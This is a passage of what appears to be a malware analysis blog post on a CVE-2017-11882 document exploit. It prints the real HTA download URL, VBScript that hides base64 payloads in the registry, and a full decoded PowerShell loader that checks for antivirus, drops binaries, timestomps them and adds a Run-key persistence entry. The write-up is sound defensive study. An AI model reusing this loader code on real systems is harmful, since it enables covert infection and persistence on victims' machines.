https://miro.medium.com/v2/resize:fit:786/1*jg292b2dNzrsJddVxaqeuQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*jg292b2dNzrsJddVxaqeuQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*jg292b2dNzrsJddVxaqeuQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*jg292b2dNzrsJddVxaqeuQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mr qg c" width="700" height="297" loading="lazy" role="presentation"/></picture></div></div></figure><p id="bc36" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">and this one:</p><figure class="pw px py pz qa qb pt pu paragraph-image"><div role="button" tabindex="0" class="qc qd gs qe bh qf"><div class="pt pu qj"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*irGqF14uiBKgitbGYHGjNg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*irGqF14uiBKgitbGYHGjNg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*irGqF14uiBKgitbGYHGjNg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*irGqF14uiBKgitbGYHGjNg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*irGqF14uiBKgitbGYHGjNg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*irGqF14uiBKgitbGYHGjNg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*irGqF14uiBKgitbGYHGjNg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mr qg c" width="700" height="128" loading="lazy" role="presentation"/></picture></div></div></figure><p id="2cc5" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">In fact, the ole object is a exploit of CVE-2017–11882.</p><p id="c509" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The implementation is a bit different than my last article, there is not an object MTF.</p><p id="6fe4" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The implementation has many matching with the public exploit: <a class="ag jw" href="https://github.com/0x09AL/CVE-2017-11882-metasploit" rel="noopener ugc nofollow" target="_blank">https://github.com/0x09AL/CVE-2017-11882-metasploit</a></p><p id="2bdb" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The exploitation is the following:</p><p id="5e00" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">an hta is downloaded here and lauched by msthll.dll.RunHMLApplication.</p><p id="af13" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">caller.exe <a class="ag jw" href="http://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta" rel="noopener ugc nofollow" target="_blank">hxxp://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta</a></p><p id="9584" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The hta is a mix of powershell, vbscript and javascript.</p><h1 id="a5f5" class="nk nl ic bf nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh bk">Installation of payload and Persistance</h1><p id="654b" class="pw-post-body-paragraph oq or ic os b ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl pm pn hv bk">The installation of the payload made by vscript a line 151</p><p id="e570" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">objWSS.RegWrite “HK”&amp;”CU\Softwa”&amp;”re\Updater\pa”&amp;”rt3&quot;, bnm, “REG_SZ”</p><p id="d378" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">here</p><p id="c2d0" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">tst = getProfile(“0”) &amp; “$c=”””&amp;c&amp;”””;$m=”””&amp;m&amp;”””;”&amp; Base64Decode(objWSS.RegRead(“HKEY_CURRENT_USER\Softwa”&amp;”re\Updater\pa”&amp;”rt3&quot;)) &amp; getProfile(“1”)<br/>objWSS.run “powershell.exe -ExecutionPolicy Bypass -Command “”” &amp; tst &amp; “”””, 0, true</p><p id="55e3" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">and here:</p><p id="4cc1" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">objWSS.RegWrite “HKCU\Software\Updater”, “”<br/> objWSS.RegWrite “HKCU\Software\Updater\part1”, p1, “REG_SZ”<br/> objWSS.RegWrite “HKCU\Software\Updater\part2”, p2, “REG_SZ”</p><p id="b229" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The registry is used like pivot.</p><p id="1f87" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">p1, p2 and bnm are three blobs of base64 data.</p><p id="94f8" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">bdm decoded is:</p><blockquote class="qk ql qm"><p id="7ba3" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(“””U2V0LUV4ZWN1dGlvblBvbGljeSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtU2NvcGUgQ3VycmVudFVzZXIgLUZvcmNlOw0KJEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZSc7DQoNCiRwbmFtZTM2ID0gIjMiICsgIjYwVHIiICsgImF5Ig0KJGJpbkRpciA9IFtFbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW0VudW1dOjpUb09iamVjdChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdLCAzNSkpKyAiXCIgKyAiV2luc2V0XENvbmZpZyIgKyAiXCI7DQokYmluID0gIldpbnNldC5leGUiOw0KdHJ5ew0KJGNtZExpbmUgPSAoW2ludF0kYykudG9TdHJpbmcoIjAwMDAwMDAwIikrKFtpbnRdJG0pLnRvU3RyaW5nKCIwMDAwMDAwMCIpOw0KJGNtZExpbmUgPSAkYmluKyAiICIgKyRjbWRMaW5lOw0KfQ0KY2F0Y2h7DQokY21kTGluZSA9ICRiaW47DQp9DQokbGluZSA9IG5ldy1vYmplY3QgYnl0ZVtdIDY0Ow0KJGJ1ZjYgPVtCeXRlW11dICgsMHgyMyAqIDY0KTsNCiRjYnl0ZXMgPSBbc3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygkY21kTGluZSk7DQpbYXJyYXldOjpjb3B5KCRjYnl0ZXMsJGxpbmUsJGNieXRlcy5sZW5ndGgpOw0KDQokYmluUGF0aCA9ICRiaW5EaXIgKyAkYmluOw0KJGJpblBhdGhkbGwgPSAkYmluRGlyICsgImNtcGJrMzIuZGxsIjsNCiRkbXliaW5QYXRoID0gJGJpbkRpciArICJjbWRsMzIuZXhlIjsNCiRycGNkbGxwYXRoID0gJGJpbkRpciArICI1NzE0NkM5Ni5kbGwiOw0KJHJ1biA9ICdIS0NVOlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1blwnOw0KJHN5c3RlbSA9ICdIS0NVOlNvZnR3YXJlXFVwZGF0ZXInOw0KJHJ1bkV4aXN0cyA9IEZhbHNlOw0KJHBuYW1lYXZyID0gImF2IiArICJnbiIgKyAidCI7DQokbXN2YnZtZGxscGF0aCA9ICRlbnY6V0lORElSICsgIlxzeXN0ZW0zMlxtc3Zidm02MC5kbGwiDQokY21kbDMycGF0aCA9ICRlbnY6V0lORElSICsgIlxzeXN0ZW0zMlxjbWRsMzIuZXhlIg0KDQokcTM2ID0gR2V0LVByb2Nlc3MgJHBuYW1lMzYgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7DQppZigkcTM2KXsNCglleGl0DQp9DQoNCmZ1bmN0aW9uIGRjKCRzKXsNCglzYWwgbiBOZXctT2JqZWN0Ow0KCSRkYXRhID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiSDRzSUFBQUFBQUEiICsgJHMpOw0KCSRtcyA9IG4gU3lzdGVtLklPLk1lbW9yeVN0cmVhbTsNCgkkbXMuV3JpdGUoJGRhdGEsIDAsICRkYXRhLkxlbmd0aCk7DQoJJG1zLlNlZWsoMCwwKSB8IE91dC1OdWxsOw0KCXJldHVybiAobiBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKG4gU3lzdGVtLklPLkNvbXByZXNzaW9uLkdaaXBTdHJlYW0oJG1zLCBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSkuUmVhZFRvRW5kKCk7DQp9Ow0KDQpmdW5jdGlvbiB1cGR0KCR0LCAkYil7DQoJKGxzICR0KS5MYXN0V3JpdGVUaW1lID0gIChscyAkYikuTGFzdFdyaXRlVGltZQ0KCShscyAkdCkuQ3JlYXRpb25UaW1lID0gKGxzICRiKS5DcmVhdGlvblRpbWUNCgkobHMgJHQpLkxhc3RBY2Nlc3NUaW1lID0gKGxzICRiKS5MYXN0QWNjZXNzVGltZQ0KfQ0KDQpmdW5jdGlvbiB3YjY0KCRwYXRoLCAkYjY0KXsNCgkkYnl0ZXMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJUVnEiICsgJGI2NCk7DQoJTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJGJpbkRpciB8IE91dC1OdWxsOw0KCVtpby5maWxlXTo6V3JpdGVBbGxCeXRlcygkcGF0aCwkYnl0ZXMpIHwgT3V0LU51bGw7DQoJdXBkdCAtdCAkcGF0aCAtYiAkY21kbDMycGF0aA0KfQ0KDQpmdW5jdGlvbiBzYigkaCwgJG4gKSB7DQogICAgJGxlbiA9ICRuLmxlbmd0aDsNCiAgICAkbGltaXQgPSAkaC5sZW5ndGggLSAkbGVuOw0KICAgIEZvciggJGkgPSAwOyAgJGkgLWxlICRsaW1pdDsgICRpKysgKSB7DQogICAgICAgICRrID0gMDsNCiAgICAgICAgRm9yKCA7ICAkayAtbHQgJGxlbjsgICRrKysgKSB7DQogICAgICAgICAgICBpZiggJG5bJGtdIC1uZSAkaFskaSska10gKSB7YnJlYWt9Ow0KICAgICAgICB9DQogICAgICAgIGlmKCAkayAtZXEgJGxlbiApe3JldHVybiAkaX07DQogICAgfQ0KICAgIHJldHVybiAtMTsNCn0NCg0KaWYoKFRlc3QtUGF0aCAkZW52OldJTkRJUlxTeXNXT1c2NCkpew0KCSRtc3Zidm1kbGxwYXRoID0gJGVudjpXSU5ESVIgKyAiXFN5c1dPVzY0XG1zdmJ2bTYwLmRsbCINCgkkY21kbDMycGF0aCA9ICRlbnY6V0lORElSICsgIlxTeXNXT1c2NFxjbWRsMzIuZXhlIg0KfQ0KDQp0cnl7DQoJaWYoIShUZXN0LVBhdGggJGJpblBhdGgpKXsNCg0KCQkkYjY0ID0gZGMgLXMgKChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRzeXN0ZW0pLnBhcnQxKTsNCgkJJGJ5dGVzID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiVFZxIiArICRiNjQpOw0KCQkkcm4gPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKChHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTExMSkpWzAuLjFdOw0KCQlbYXJyYXldOjpjb3B5KCRybiwwLCRieXRlcywkYnl0ZXMubGVuZ3RoIC0gMiwyKTsNCgkJTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJGJpbkRpciB8IE91dC1OdWxsOw0KCQlbaW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoJGJpblBhdGgsJGJ5dGVzKSB8IE91dC1OdWxsOw0KCQl1cGR0IC10ICRiaW5QYXRoIC1iICRjbWRsMzJwYXRoDQoNCgkJJGI2NGRsbCA9IGRjIC1zICgoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkc3lzdGVtKS5wYXJ0Mik7DQogICAgICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIlRWcSIgKyAkYjY0ZGxsKTsNCgkJW2FycmF5XTo6Y29weSgkbGluZSwwLCRieXRlcywoc2IgLWggJGJ5dGVzIC1uICRidWY2KSw2NCk7DQoJCU5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlIC1QYXRoICRiaW5EaXIgfCBPdXQtTnVsbDsNCgkJW2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRiaW5QYXRoZGxsLCRieXRlcykgfCBPdXQtTnVsbDsNCgkJdXBkdCAtdCAkYmluUGF0aGRsbCAtYiAkY21kbDMycGF0aA0KCX0NCg0KCVJlbW92ZS1JdGVtIC1QYXRoICRzeXN0ZW0gfCBPdXQtTnVsbDsNCglSZW1vdmUtSXRlbSAkUFJPRklMRS5DdXJyZW50VXNlckFsbEhvc3RzIHwgT3V0LU51bGw7DQoJTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcnVuIC1OYW1lICJXaW5zb3VuZCIgLVByb3BlcnR5VHlwZSBTdHJpbmcgLVZhbHVlICRkbXliaW5QYXRoIHwgT3V0LU51bGw7DQoJDQoJQ29weS1JdGVtICAkbXN2YnZtZGxscGF0aCAkcnBjZGxscGF0aA0KCXVwZHQgLXQgJHJwY2RsbHBhdGggLWIgJG1zdmJ2bWRsbHBhdGgNCg0KCUNvcHktSXRlbSAkY21kbDMycGF0aCAkZG15YmluUGF0aA0KCXVwZHQgLXQgJGRteWJpblBhdGggLWIgJGNtZGwzMnBhdGgNCg0KCSRhdnIgPSBHZXQtUHJvY2VzcyAkcG5hbWVhdnIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCglpZiAoISRhdnIpIHsNCgkJJigkZG15YmluUGF0aCkgfCBPdXQtTnVsbDsNCgl9DQoJRXhpdA0KfQ0KY2F0Y2ggew0KCSRfLkV4Y2VwdGlvbi5NZXNzYWdlIHwgT3V0LU51bGw7DQp9&quot;””)))</p></blockquote><p id="3d63" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">There is a new base64 block decoded:</p><blockquote class="qk ql qm"><p id="7386" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force;<br/>$ErrorActionPreference=’SilentlyContinue’;</p><p id="818a" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$pname36 = “3” + “60Tr” + “ay”<br/>$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\” + “Winset\Config” + “\”;<br/>$bin = “Winset.exe”;<br/>try{<br/>$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);<br/>$cmdLine = $bin+ “ “ +$cmdLine;<br/>}<br/>catch{<br/>$cmdLine = $bin;<br/>}<br/>$line = new-object byte[] 64;<br/>$buf6 =[Byte[]] (,0x23 * 64);<br/>$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);<br/>[array]::copy($cbytes,$line,$cbytes.length);</p><p id="58ba" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$binPath = $binDir + $bin;<br/>$binPathdll = $binDir + “cmpbk32.dll”;<br/>$dmybinPath = $binDir + “cmdl32.exe”;<br/>$rpcdllpath = $binDir + “57146C96.dll”;<br/>$run = ‘HKCU:Software\Microsoft\Windows\CurrentVersion\Run\’;<br/>$system = ‘HKCU:Software\Updater’;<br/>$runExists = False;<br/>$pnameavr = “av” + “gn” + “t”;<br/>$msvbvmdllpath = $env:WINDIR + “\system32\msvbvm60.dll”<br/>$cmdl32path = $env:WINDIR + “\system32\cmdl32.exe”</p><p id="2203" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;<br/>if($q36){<br/> exit<br/>}</p><p id="4b28" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">function dc($s){<br/> sal n New-Object;<br/> $data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);<br/> $ms = n System.IO.MemoryStream;<br/> $ms.Write($data, 0, $data.Length);<br/> $ms.Seek(0,0) | Out-Null;<br/> return (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();<br/>};</p><p id="f854" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">function updt($t, $b){<br/> (ls $t).LastWriteTime = (ls $b).LastWriteTime<br/> (ls $t).CreationTime = (ls $b).CreationTime<br/> (ls $t).LastAccessTime = (ls $b).LastAccessTime<br/>}</p><p id="2c33" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">function wb64($path, $b64){<br/> $bytes = [System.Convert]::FromBase64String(“TVq” + $b64);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($path,$bytes) | Out-Null;<br/> updt -t $path -b $cmdl32path<br/>}</p><p id="0563" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">function sb($h, $n ) {<br/> $len = $n.length;<br/> $limit = $h.length — $len;<br/> For( $i = 0; $i -le $limit; $i++ ) {<br/> $k = 0;<br/> For( ; $k -lt $len; $k++ ) {<br/> if( $n[$k] -ne $h[$i+$k] ) {break};<br/> }<br/> if( $k -eq $len ){return $i};<br/> }<br/> return -1;<br/>}</p><p id="14bf" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">if((Test-Path $env:WINDIR\SysWOW64)){<br/> $msvbvmdllpath = $env:WINDIR + “\SysWOW64\msvbvm60.dll”<br/> $cmdl32path = $env:WINDIR + “\SysWOW64\cmdl32.exe”<br/>}</p><p id="d993" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">try{<br/> if(!(Test-Path $binPath)){</p><p id="b496" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$b64 = dc -s ((Get-ItemProperty -Path $system).part1);<br/> $bytes = [System.Convert]::FromBase64String(“TVq” + $b64);<br/> $rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];<br/> [array]::copy($rn,0,$bytes,$bytes.length — 2,2);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;<br/> updt -t $binPath -b $cmdl32path</p><p id="9d6a" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);<br/> $bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);<br/> [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;<br/> updt -t $binPathdll -b $cmdl32path<br/> }</p><p id="ca4f" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">Remove-Item -Path $system | Out-Null;<br/> Remove-Item $PROFILE.CurrentUserAllHosts | Out-Null;<br/> New-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;<br/> <br/> Copy-Item $msvbvmdllpath $rpcdllpath<br/> updt -t $rpcdllpath -b $msvbvmdllpath</p><p id="28b4" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">Copy-Item $cmdl32path $dmybinPath<br/> updt -t $dmybinPath -b $cmdl32path</p><p id="737b" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$avr = Get-Process $pnameavr -ErrorAction SilentlyContinue<br/> if (!$avr) {<br/> &amp;($dmybinPath) | Out-Null;<br/> }<br/> Exit<br/>}<br/>catch {<br/> $_.Exception.Message | Out-Null;<br/>}</p></blockquote><p id="dd52" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">This powershell checks if the AV 360 is installed:</p><blockquote class="qk ql qm"><p id="cc6b" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$pname36 = “3” + “60Tr” + “ay”</p><p id="fd7e" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;<br/>if($q36){<br/> exit<br/>}</p></blockquote><p id="6f46" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">We can imagine the attackers were made a recon step before.</p><p id="cfbc" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The folder where the loadin chain is:</p><blockquote class="qk ql qm"><p id="12ee" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\” + “Winset\Config” + “\”;</p></blockquote><p id="dd1f" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">The powershell copies:</p><p id="7853" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$msvbvmdllpath = $env:WINDIR + “\system32\msvbvm60.dll”<br/>$cmdl32path = $env:WINDIR + “\system32\cmdl32.exe”</p><p id="805a" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">Copy-Item $cmdl32path $dmybinPath</p><p id="b722" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">Copy-Item $msvbvmdllpath $rpcdllpath</p><p id="ba77" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">So msvbvm60.dll becomes: 57146C96.dll</p><p id="64ed" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">And Winset.exe and cmpbk32.dll are decoded and copied in the same folder.</p><p id="4983" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">part1 and part2 is the reg key base here $system = ‘HKCU:Software\Updater’;:</p><p id="1042" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">objWSS.RegWrite “HKCU\Software\Updater”, “”<br/>objWSS.RegWrite “HKCU\Software\Updater\part1”, p1, “REG_SZ”<br/>objWSS.RegWrite “HKCU\Software\Updater\part2”, p2, “REG_SZ”</p><p id="a53d" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">part1 is big blob of base64 data.</p><p id="6308" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">Firstly the registry key is retrieve:</p><p id="6384" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">(Get-ItemProperty -Path $system).part1</p><p id="1a64" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">after is the function dc is called.</p><blockquote class="qk ql qm"><p id="992c" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">function dc($s){<br/> sal n New-Object;<br/> $data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);<br/> $ms = n System.IO.MemoryStream;<br/> $ms.Write($data, 0, $data.Length);<br/> $ms.Seek(0,0) | Out-Null;<br/> return (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();<br/>};</p></blockquote><p id="35c5" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">this string “H4sIAAAAAAA” is added at part2 and the data is decoded an</p><blockquote class="qk ql qm"><p id="2852" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);</p></blockquote><p id="ca52" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">and unzip:</p><blockquote class="qk ql qm"><p id="5f3b" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();<br/>};</p></blockquote><p id="ae1f" class="pw-post-body-paragraph oq or ic os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">and the Mz header in base64 is added and decoded:</p><blockquote class="qk ql qm"><p id="10e5" class="oq or qn os b ot po ov ow ox pp oz pa pb pq pd pe pf pr ph pi pj ps pl pm pn hv bk">$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);</p></blockquote><p id="762a" class="pw-post-body-paragraph oq or ic os b ot po ov 